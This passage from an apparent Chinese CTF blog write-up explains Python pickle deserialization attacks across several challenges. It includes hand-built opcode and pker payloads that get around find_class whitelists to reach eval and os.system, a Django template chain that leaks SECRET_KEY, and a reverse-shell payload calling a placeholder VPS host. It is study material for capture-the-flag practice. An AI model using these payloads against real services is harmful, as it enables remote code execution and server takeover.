</span></span><span style=display:flex><span><span style=color:#111>user</span><span style=color:#f92672>.</span><span style=color:#111>data</span><span style=color:#f92672>=</span><span style=color:#d88200>&#34;tyskill&#34;</span>
</span></span><span style=display:flex><span><span style=color:#111>door</span><span style=color:#f92672>=</span><span style=color:#111>INST</span><span style=color:#111>(</span><span style=color:#d88200>&#34;config&#34;</span><span style=color:#111>,</span><span style=color:#d88200>&#34;backdoor&#34;</span><span style=color:#111>,[</span><span style=color:#d88200>&#34;__import__(&#39;subprocess&#39;).call(</span><span style=color:#8045ff>\&#34;</span><span style=color:#d88200>echo -e &#39;#!/bin/bash</span><span style=color:#8045ff>\\</span><span style=color:#d88200>nsh -i &gt;&amp; /dev/tcp/you_vps_ip/port 0&gt;&amp;1&#39;&gt;x &amp;&amp; bash x &amp;&amp; rm -rf x</span><span style=color:#8045ff>\&#34;</span><span style=color:#d88200>,shell=True)&#34;</span><span style=color:#111>])</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>return</span> <span style=color:#111>user</span>
</span></span></code></pre></div><p>然后<code>base64.b64encode(data)</code>加进<code>session['info']</code>中拿到shell</p><p>看wp，后面的步骤好像还跟pwn有点关系，我对pwn毫无研究，不献丑了，指路两个wp-><a href=https://juejin.cn/post/6994717395298287624>wp1</a> | <a href=https://ctf.njupt.edu.cn/663.html#what_pickle>wp2</a></p></details><h3 id=--仅可以引入builtins模块>&ndash;&#187;仅可以引入<code>builtins</code>模块</h3><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/9a07ed4bd4c85ec67bcc780dae379984.png alt=img></p><p>更多知识参考：<a href=https://blog.51cto.com/xpleaf/1764849>深入理解Python中的<code>__builtin__</code>和<code>__builtins__</code></a> | [Python 的内建对象](<a href=https://www.jianshu.com/p/645e973>https://www.jianshu.com/p/645e973</a> 83c1f) | <a href=https://zhuanlan.zhihu.com/p/125693125><code>__builtins__</code> 与 <code>__builtin__</code>（builtins）</a></p><details><summary><h4 class=inline>栗子4 - [Code-Breaking 2018] picklecode</h4></summary><p>本地复现还是失败，docker地址->https://github.com/phith0n/code-breaking/tree/master/2018/picklecode（就跟被docker诅咒了一样 从来没有成功的用docker复现过一道题😭😭😭真就脑补出flag了</p><p>审计源码，是一个django的项目（正好之前的实训做的就是django的项目，看源码轻松一些），主文件夹是core，有一个名为challenge的app</p><p>看core下的settings.py比默认的配置多了54和55行</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809152122940.png alt=image-20210809152122940></p><p>用了特殊的SESSION_ENGINE和SESSION_SERIALIZER，前者指的是django将用户认证信息存储在哪里 后者指django用什么方式存储认证信息，也就相当于先经过SESSION_SERIAZLIZER指定的方式转换为字符串，再有SESSION_ENGINE指定的方式存储到某个地方。默认的django项目中，存储位置应该是django.contrib.sessions.backends.db，序列化方式应该是django.contrib.sessions.serializers.JSONSerializer；而这里就是用pickle序列化后的形式，加签名singed后存储在cookie中。那这里肯定要控制session，结合pickle来rce了；跟过去看看</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809152317363.png alt=image-20210809152317363></p><p>依旧是重写了<code>find_class()</code>方法，只有模块是内置的builtins（不需要import就可以用的）并且名字不能在黑名单中才可以；这里的绕过是第二个考点了，先翻回去看一下仅有的app的views.py</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809153617320.png alt=image-20210809153617320></p><p>模板部分直接拼接了request.user.username，这是注册时传入，有模板注入漏洞，找找调用链</p><p>（因为本地环境太垃圾了 没复现 这里云做题了）在模板处下断点，可以看到很多的上下文变量，通常会存在的有request, user, perms，这里用的利用链是（注意django模板引擎无法读取下划线开头的属性）<code>{{request.user.groups.source_field.opts.app_config.module.admin.settings.SECRET_KEY}}</code>，注册一个名为这个的用户即可获得签名的密钥。</p><p>再掉头回去思考opcode的编写。重写<code>find_class()</code>之后限制很多，但通过builtins仍然可以用<code>getattr()</code>；那么就分两步走，先通过<code>builtins.getattr('builtins, 'eval')</code>来获取<code>eval()</code>，再执行代码。那么如何手写protocol=0的opcode捏？</p><p>首先引入模块builtins和函数getattr</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#111>cbuiltins</span>
</span></span><span style=display:flex><span><span style=color:#111>getattr</span>
</span></span></code></pre></div><p>然后需要获取当前的上下文，用globals()</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#111>cbuiltins</span>
</span></span><span style=display:flex><span><span style=color:#111>globals</span>
</span></span></code></pre></div><p>globals是个字典，所以还要获取dict这个对象</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#111>cbuiltins</span>
</span></span><span style=display:flex><span><span style=color:#111>dict</span>
</span></span></code></pre></div><p>还要执行globals()获取完整上下文</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#111>cbuiltins</span>
</span></span><span style=display:flex><span><span style=color:#111>globals</span>
</span></span><span style=display:flex><span><span style=color:#111>(</span><span style=color:#111>tR</span>
</span></span></code></pre></div><p>栈顶元素是builtins.globals，压入一个空元组<code>(t</code>，然后用<code>R</code>执行</p><p>然后用dict.get()方法从globals的字典中拿到键名为builtions的值</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#111>cbuiltins</span>
</span></span><span style=display:flex><span><span style=color:#111>getattr</span>
</span></span><span style=display:flex><span><span style=color:#111>(</span><span style=color:#111>cbuiltins</span>
</span></span><span style=display:flex><span><span style=color:#111>dict</span>
</span></span><span style=display:flex><span><span style=color:#111>S</span><span style=color:#d88200>&#39;get&#39;</span>
</span></span><span style=display:flex><span><span style=color:#111>tR</span><span style=color:#111>(</span><span style=color:#111>cbuiltins</span>
</span></span><span style=display:flex><span><span style=color:#111>globals</span>
</span></span><span style=display:flex><span><span style=color:#111>(</span><span style=color:#111>tRS</span><span style=color:#d88200>&#39;builtins&#39;</span>
</span></span><span style=display:flex><span><span style=color:#111>tR</span><span style=color:#f92672>.</span>
</span></span></code></pre></div><p>反序列化后得到builtins对象<code>&lt;module 'builtins' (built-in)></code>；之后再用getattr从builtins对象中取出eval，也就是再套一层娃</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#111>cbuiltins</span>
</span></span><span style=display:flex><span><span style=color:#111>getattr</span>
</span></span><span style=display:flex><span><span style=color:#111>(</span><span style=color:#111>cbuiltins</span>
</span></span><span style=display:flex><span><span style=color:#111>getattr</span>
</span></span><span style=display:flex><span><span style=color:#111>(</span><span style=color:#111>cbuiltins</span>
</span></span><span style=display:flex><span><span style=color:#111>dict</span>
</span></span><span style=display:flex><span><span style=color:#111>S</span><span style=color:#d88200>&#39;get&#39;</span>
</span></span><span style=display:flex><span><span style=color:#111>tR</span><span style=color:#111>(</span><span style=color:#111>cbuiltins</span>
</span></span><span style=display:flex><span><span style=color:#111>globals</span>
</span></span><span style=display:flex><span><span style=color:#111>(</span><span style=color:#111>tRS</span><span style=color:#d88200>&#39;builtins&#39;</span>
</span></span><span style=display:flex><span><span style=color:#111>tRS</span><span style=color:#d88200>&#39;eval&#39;</span>
</span></span><span style=display:flex><span><span style=color:#111>tR</span><span style=color:#f92672>.</span>
</span></span></code></pre></div><p><code>&lt;built-in function eval></code>现在已经拿到了eval对象，再执行代码</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#111>cbuiltins</span>
</span></span><span style=display:flex><span><span style=color:#111>getattr</span>
</span></span><span style=display:flex><span><span style=color:#111>(</span><span style=color:#111>cbuiltins</span>
</span></span><span style=display:flex><span><span style=color:#111>getattr</span>
</span></span><span style=display:flex><span><span style=color:#111>(</span><span style=color:#111>cbuiltins</span>
</span></span><span style=display:flex><span><span style=color:#111>dict</span>
</span></span><span style=display:flex><span><span style=color:#111>S</span><span style=color:#d88200>&#39;get&#39;</span>
</span></span><span style=display:flex><span><span style=color:#111>tR</span><span style=color:#111>(</span><span style=color:#111>cbuiltins</span>
</span></span><span style=display:flex><span><span style=color:#111>globals</span>
</span></span><span style=display:flex><span><span style=color:#111>(</span><span style=color:#111>tRS</span><span style=color:#d88200>&#39;builtins&#39;</span>
</span></span><span style=display:flex><span><span style=color:#111>tRS</span><span style=color:#d88200>&#39;eval&#39;</span>
</span></span><span style=display:flex><span><span style=color:#111>tR</span><span style=color:#111>(</span><span style=color:#111>S</span><span style=color:#d88200>&#39;__import__(&#34;os&#34;).system(&#34;ls&#34;)&#39;</span>
</span></span><span style=display:flex><span><span style=color:#111>tR</span><span style=color:#f92672>.</span>
</span></span></code></pre></div><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809172045469.png alt=image-20210809172045469></p><p>成功执行代码（注意运行时不仅需要引入pickle 也要引入builtins才可以！）</p><p>————用pker</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#111>getattr</span> <span style=color:#f92672>=</span> <span style=color:#111>GLOBAL</span><span style=color:#111>(</span><span style=color:#d88200>&#39;builtins&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;getattr&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#111>dict</span> <span style=color:#f92672>=</span> <span style=color:#111>GLOBAL</span><span style=color:#111>(</span><span style=color:#d88200>&#39;builtins&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;dict&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#111>dict_get</span> <span style=color:#f92672>=</span> <span style=color:#111>getattr</span><span style=color:#111>(</span><span style=color:#111>dict</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;get&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#111>globals</span> <span style=color:#f92672>=</span> <span style=color:#111>GLOBAL</span><span style=color:#111>(</span><span style=color:#d88200>&#39;builtins&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;globals&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#111>builtins</span> <span style=color:#f92672>=</span> <span style=color:#111>globals</span><span style=color:#111>()</span>
</span></span><span style=display:flex><span><span style=color:#111>__builtins__</span> <span style=color:#f92672>=</span> <span style=color:#111>dict_get</span><span style=color:#111>(</span><span style=color:#111>builtins</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;__builtins__&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#111>eval</span> <span style=color:#f92672>=</span> <span style=color:#111>getattr</span><span style=color:#111>(</span><span style=color:#111>__builtins__</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;eval&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#111>eval</span><span style=color:#111>(</span><span style=color:#d88200>&#39;__import__(&#34;os&#34;).system(&#34;whoami&#34;)&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>return</span>
</span></span><span style=display:flex><span><span style=color:#75715e># b&#39;cbuiltins\ngetattr\np0\n0cbuiltins\ndict\np1\n0g0\n(g1\nS\&#39;get\&#39;\ntRp2\n0cbuiltins\nglobals\np3\n0g3\n(tRp4\n0g2\n(g4\nS\&#39;__builtins__\&#39;\ntRp5\n0g0\n(g5\nS\&#39;eval\&#39;\ntRp6\n0g6\n(S\&#39;__import__(&#34;os&#34;).system(&#34;whoami&#34;)\&#39;\ntR.&#39;</span>
</span></span></code></pre></div><p>参考：<a href=https://www.redmango.top/article/64>wp1</a> | <a href=https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html>Code-Breaking中的两个Python沙箱</a> | <a href=https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html>Python 格式化字符串漏洞（Django为例）</a></p></details><h3 id=--仅可以引入sys模块名字中不带点号>&ndash;&#187;仅可以引入<code>sys</code>模块&名字中不带<code>.</code>点号</h3><details><summary><h4 class=inline>栗子5 - [BalsnCTF 2019] Pyshv1</h4></summary><p>题目环境->https://github.com/sasdf/ctf/tree/master/tasks/2019/BalsnCTF/misc/pyshv1</p><p>审计一下源码，先看一下肯定会不secure的securePickle.oy</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210811212055295.png alt=image-20210811212055295></p><p>重写<code>find_class()</code>，被调用时可以灵活添加白名单；再看看server.py</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210811211736904.png alt=image-20210811211736904></p><p>将输入的内容先转为ascii码形式被b64加密，再反序列化出来；其中白名单是sys模块</p><p>但是这个sys模块并不安全：sys模块有一个字典对象sys.modules，它包含了运行时所有py程序所引入的所有模块(a cache of imported modules) ，如果它被改变 引入的模块就会被改变。而它也包括sys本身，也就是套娃<code>sys.modules['sys']=sys.modules</code>。那么如果我们先从sys中引入modules: <code>import modules from sys</code>，然后将<code>modules['sys']</code>改为<code>modules['os']</code>就将成功引入os模块。</p><p>但有个缺陷是modules为dict，需要用<code>getattr(sys.modules[module], name)</code>进行取值，也就是先取出modules中的get函数，然后再用get来取出os，再进行替换修改</p><p>pker</p><pre tabindex=0><code>modules=GLOBAL(&#39;sys&#39;, &#39;modules&#39;)
modules[&#39;sys&#39;]=modules
modules_get=GLOBAL(&#39;sys&#39;, &#39;get&#39;)
os=modules_get(&#39;os&#39;)
modules[&#39;sys&#39;]=os
system=GLOBAL(&#39;sys&#39;, &#39;system&#39;)
system(&#39;dir&#39;)
return
</code></pre><p>opcode:</p><pre tabindex=0><code>b&#34;csys\nmodules\np0\n0g0\nS&#39;sys&#39;\ng0\nscsys\nget\np2\n0g2\n(S&#39;os&#39;\ntRp3\n0g0\nS&#39;sys&#39;\ng3\nscsys\nsystem\np5\n0g5\n(S&#39;dir&#39;\ntR.&#34;
</code></pre><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210811215300764.png alt=image-20210811215300764></p></details><h3 id=--仅可以引入题目中自设空模块>&ndash;&#187;仅可以引入题目中自设空模块</h3><details><summary><h4 class=inline>栗子6 - [BalsnCTF 2019] Pyshv2</h4></summary><p>题目环境->https://github.com/sasdf/ctf/tree/master/tasks/2019/BalsnCTF/misc/pyshv2</p><p><code>find_class()</code>稍有区别，在<code>getattr()</code>之前先用了<code>__import__()</code></p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210811220348086.png alt=image-20210811220348086></p><p>这次的白名单是<code>structs</code>，然鹅这是个空的模块 虚晃一枪。不过是空的不要紧，照样有内置方法。</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210811220801646.png alt=image-20210811220801646></p><p><code>__builtins__</code>是所有模块公有的字典，记录所有的内建函数，可以通过对<code>__builtins__</code>内相应的键来修改对应的函数，上图中我们找到了eval方法，但取出eval这个键另外需要一个get方法才能做到。</p><p>我们知道，<code>__getattribute__</code>魔术方法可以访问任意属性。而同时<code>__import__</code>并不是铁板一块，它的全部参数是<code>__import__(name, globals=None, locals=None, fromlist=(), level=0)</code>，它可以被替换（通过导入builtins模块并赋值给<code>builtins.__import__</code>）来可以修改import语句的语义并且不会导致代码问题，而题目中重写的find_class()特地在getattr()之前调用了<code>__import__</code>，现在我们可以劫持这个__import__，让它变为<code>__getattribute__</code>，让我们引入的structs变为<code>structs.__getattribute__(structs).xxx</code>。</p><p>对于引入模块的检查只会出现在b&rsquo;c&rsquo;时，所以我们在用<code>S</code>操作码劫持<code>__import__</code>时并不会引发find_class()的过滤。</p><p>然而我们不能直接getattr()=getattr()这样覆盖<code>__import__</code>，我们还需要<code>__dict__</code>的帮忙。<code>__dict__</code>是一个列表，存储并决定了一个对象的所有属性，如果它的内容被改变，属性也会跟着改变。</p><p>所以整合一下上面的思路：我们先要引入助手list<code>structs.__dict__</code>，取出structs空模块的内建函数（一个待取的dict）<code>structs.__builtins__</code>和我们需要的魔术方法<code>structs.__getattribute__</code>。之后从内建函数<code>structs.__builtins__</code>中将键名为<code>__import__</code>的值替换为<code>structs.__getattribute__</code>，然后借助<code>__dict__</code>将structs的structs属性覆盖为修改后的内建函数。这时，我们再次用b&rsquo;c&rsquo;从structs中引入get时触发find_class()中的<code>__import__</code>，也就相当于在执行<code>structs.__getattribute__('structs').get</code>，这样我们就拿到了get方法。而之前我们又已经替换了structs属性为内建函数<code>__builtins__</code>，所以利用这个得到的get方法就可以从<code>__builtins__</code>中取出eval，执行代码了。之后执行代码的部分同上面的sys.modules的思路。</p><p>pker</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#111>__dict__</span> <span style=color:#f92672>=</span> <span style=color:#111>GLOBAL</span><span style=color:#111>(</span><span style=color:#d88200>&#39;structs&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;__dict__&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#111>__builtins__</span> <span style=color:#f92672>=</span> <span style=color:#111>GLOBAL</span><span style=color:#111>(</span><span style=color:#d88200>&#39;structs&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;__builtins__&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#111>gtat</span> <span style=color:#f92672>=</span> <span style=color:#111>GLOBAL</span><span style=color:#111>(</span><span style=color:#d88200>&#39;structs&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;__getattribute__&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#111>__builtins__</span><span style=color:#111>[</span><span style=color:#d88200>&#39;__import__&#39;</span><span style=color:#111>]</span> <span style=color:#f92672>=</span> <span style=color:#111>gtat</span>
</span></span><span style=display:flex><span><span style=color:#111>__dict__</span><span style=color:#111>[</span><span style=color:#d88200>&#39;structs&#39;</span><span style=color:#111>]</span> <span style=color:#f92672>=</span> <span style=color:#111>__builtins__</span>
</span></span><span style=display:flex><span><span style=color:#111>builtin_get</span> <span style=color:#f92672>=</span> <span style=color:#111>GLOBAL</span><span style=color:#111>(</span><span style=color:#d88200>&#39;structs&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;get&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#111>eval</span> <span style=color:#f92672>=</span> <span style=color:#111>builtin_get</span><span style=color:#111>(</span><span style=color:#d88200>&#39;eval&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#111>eval</span><span style=color:#111>(</span><span style=color:#d88200>&#39;pickle.sys.modules[&#39;</span><span style=color:#111>os</span><span style=color:#d88200>&#39;].system(&#39;</span><span style=color:#111>cat</span> <span style=color:#f92672>../</span><span style=color:#111>flag</span><span style=color:#f92672>.</span><span style=color:#111>txt</span><span style=color:#d88200>&#39;)&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>return</span>
</span></span></code></pre></div><p>opcode</p><pre tabindex=0><code>b&#34;cstructs\n__dict__\np0\n0cstructs\n__builtins__\np1\n0cstructs\n__getattribute__\np2\n0g1\nS&#39;__import__&#39;\ng2\nsg0\nS&#39;structs&#39;\ng1\nscstructs\nget\np5\n0g5\n(S&#39;eval&#39;\ntRp6\n0g6\n(S&#39;pickle.sys.modules[&#39;os&#39;].system(&#39;cat ../flag.txt&#39;)&#39;\ntR.&#34;
</code></pre></details><h3 id=禁止br操作码>禁止<code>b'R'</code>操作码</h3><p>也就相当于不可以用<code>__reduce__</code>，有以下几种应对方法（以下方法同样可以单独使用鸭！！！），变量覆盖（无直接代码执行）或利用<code>b'i'</code>，<code>b'i'</code>，<code>b'b'</code>这些操作码来rce。</p><h3 id=--变量覆盖>&ndash;&#187;变量覆盖</h3><details><summary><h4 class=inline>栗子7 - [高校战“疫”网络安全分享赛2020] webtmp</h4></summary><p>（这个题是缝合的[SJTU 2019]Pickle 以及 [SJTU 2019]Pickle-Revenge的题 = =。限制了<code>R</code>操作码，同时重写<code>find_class()</code>限制引入模块为<code>__main__</code>，两个考点）</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>base64</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>io</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>sys</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>pickle</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> <span style=color:#111>flask</span> <span style=color:#f92672>import</span> <span style=color:#111>Flask</span><span style=color:#111>,</span> <span style=color:#111>Response</span><span style=color:#111>,</span> <span style=color:#111>render_template</span><span style=color:#111>,</span> <span style=color:#111>request</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>secret</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#111>app</span> <span style=color:#f92672>=</span> <span style=color:#111>Flask</span><span style=color:#111>(</span><span style=color:#111>__name__</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>class</span> <span style=color:#75af00>Animal</span><span style=color:#111>:</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>def</span> <span style=color:#111>__init__</span><span style=color:#111>(</span><span style=color:#111>self</span><span style=color:#111>,</span> <span style=color:#111>name</span><span style=color:#111>,</span> <span style=color:#111>category</span><span style=color:#111>):</span>
</span></span><span style=display:flex><span>        <span style=color:#111>self</span><span style=color:#f92672>.</span><span style=color:#111>name</span> <span style=color:#f92672>=</span> <span style=color:#111>name</span>
</span></span><span style=display:flex><span>        <span style=color:#111>self</span><span style=color:#f92672>.</span><span style=color:#111>category</span> <span style=color:#f92672>=</span> <span style=color:#111>category</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>def</span> <span style=color:#111>__repr__</span><span style=color:#111>(</span><span style=color:#111>self</span><span style=color:#111>):</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>return</span> <span style=color:#d88200>f</span><span style=color:#d88200>&#39;Animal(name=</span><span style=color:#d88200>{</span><span style=color:#111>self</span><span style=color:#f92672>.</span><span style=color:#111>name</span><span style=color:#d88200>!r}</span><span style=color:#d88200>, category=</span><span style=color:#d88200>{</span><span style=color:#111>self</span><span style=color:#f92672>.</span><span style=color:#111>category</span><span style=color:#d88200>!r}</span><span style=color:#d88200>)&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>def</span> <span style=color:#111>__eq__</span><span style=color:#111>(</span><span style=color:#111>self</span><span style=color:#111>,</span> <span style=color:#111>other</span><span style=color:#111>):</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>return</span> <span style=color:#111>type</span><span style=color:#111>(</span><span style=color:#111>other</span><span style=color:#111>)</span> <span style=color:#f92672>is</span> <span style=color:#111>Animal</span> <span style=color:#f92672>and</span> <span style=color:#111>self</span><span style=color:#f92672>.</span><span style=color:#111>name</span> <span style=color:#f92672>==</span> <span style=color:#111>other</span><span style=color:#f92672>.</span><span style=color:#111>name</span> <span style=color:#f92672>and</span> <span style=color:#111>self</span><span style=color:#f92672>.</span><span style=color:#111>category</span> <span style=color:#f92672>==</span> <span style=color:#111>other</span><span style=color:#f92672>.</span><span style=color:#111>category</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>class</span> <span style=color:#75af00>RestrictedUnpickler</span><span style=color:#111>(</span><span style=color:#111>pickle</span><span style=color:#f92672>.</span><span style=color:#111>Unpickler</span><span style=color:#111>):</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>def</span> <span style=color:#75af00>find_class</span><span style=color:#111>(</span><span style=color:#111>self</span><span style=color:#111>,</span> <span style=color:#111>module</span><span style=color:#111>,</span> <span style=color:#111>name</span><span style=color:#111>):</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>if</span> <span style=color:#111>module</span> <span style=color:#f92672>==</span> <span style=color:#d88200>&#39;__main__&#39;</span><span style=color:#111>:</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>return</span> <span style=color:#111>getattr</span><span style=color:#111>(</span><span style=color:#111>sys</span><span style=color:#f92672>.</span><span style=color:#111>modules</span><span style=color:#111>[</span><span style=color:#d88200>&#39;__main__&#39;</span><span style=color:#111>],</span> <span style=color:#111>name</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>raise</span> <span style=color:#111>pickle</span><span style=color:#f92672>.</span><span style=color:#111>UnpicklingError</span><span style=color:#111>(</span><span style=color:#d88200>&#34;global &#39;</span><span style=color:#d88200>%s</span><span style=color:#d88200>.</span><span style=color:#d88200>%s</span><span style=color:#d88200>&#39; is forbidden&#34;</span> <span style=color:#f92672>%</span> <span style=color:#111>(</span><span style=color:#111>module</span><span style=color:#111>,</span> <span style=color:#111>name</span><span style=color:#111>))</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>def</span> <span style=color:#75af00>restricted_loads</span><span style=color:#111>(</span><span style=color:#111>s</span><span style=color:#111>):</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>return</span> <span style=color:#111>RestrictedUnpickler</span><span style=color:#111>(</span><span style=color:#111>io</span><span style=color:#f92672>.</span><span style=color:#111>BytesIO</span><span style=color:#111>(</span><span style=color:#111>s</span><span style=color:#111>))</span><span style=color:#f92672>.</span><span style=color:#111>load</span><span style=color:#111>()</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>def</span> <span style=color:#75af00>read</span><span style=color:#111>(</span><span style=color:#111>filename</span><span style=color:#111>,</span> <span style=color:#111>encoding</span><span style=color:#f92672>=</span><span style=color:#d88200>&#39;utf-8&#39;</span><span style=color:#111>):</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>with</span> <span style=color:#111>open</span><span style=color:#111>(</span><span style=color:#111>filename</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;r&#39;</span><span style=color:#111>,</span> <span style=color:#111>encoding</span><span style=color:#f92672>=</span><span style=color:#111>encoding</span><span style=color:#111>)</span> <span style=color:#00a8c8>as</span> <span style=color:#111>fin</span><span style=color:#111>:</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>return</span> <span style=color:#111>fin</span><span style=color:#f92672>.</span><span style=color:#111>read</span><span style=color:#111>()</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75af00>@app.route</span><span style=color:#111>(</span><span style=color:#d88200>&#39;/&#39;</span><span style=color:#111>,</span> <span style=color:#111>methods</span><span style=color:#f92672>=</span><span style=color:#111>[</span><span style=color:#d88200>&#39;GET&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;POST&#39;</span><span style=color:#111>])</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>def</span> <span style=color:#75af00>index</span><span style=color:#111>():</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>if</span> <span style=color:#111>request</span><span style=color:#f92672>.</span><span style=color:#111>args</span><span style=color:#f92672>.</span><span style=color:#111>get</span><span style=color:#111>(</span><span style=color:#d88200>&#39;source&#39;</span><span style=color:#111>):</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>return</span> <span style=color:#111>Response</span><span style=color:#111>(</span><span style=color:#111>read</span><span style=color:#111>(</span><span style=color:#111>__file__</span><span style=color:#111>),</span> <span style=color:#111>mimetype</span><span style=color:#f92672>=</span><span style=color:#d88200>&#39;text/plain&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>if</span> <span style=color:#111>request</span><span style=color:#f92672>.</span><span style=color:#111>method</span> <span style=color:#f92672>==</span> <span style=color:#d88200>&#39;POST&#39;</span><span style=color:#111>:</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>try</span><span style=color:#111>:</span>
</span></span><span style=display:flex><span>            <span style=color:#111>pickle_data</span> <span style=color:#f92672>=</span> <span style=color:#111>request</span><span style=color:#f92672>.</span><span style=color:#111>form</span><span style=color:#f92672>.</span><span style=color:#111>get</span><span style=color:#111>(</span><span style=color:#d88200>&#39;data&#39;</span><span style=color:#111>)</span>
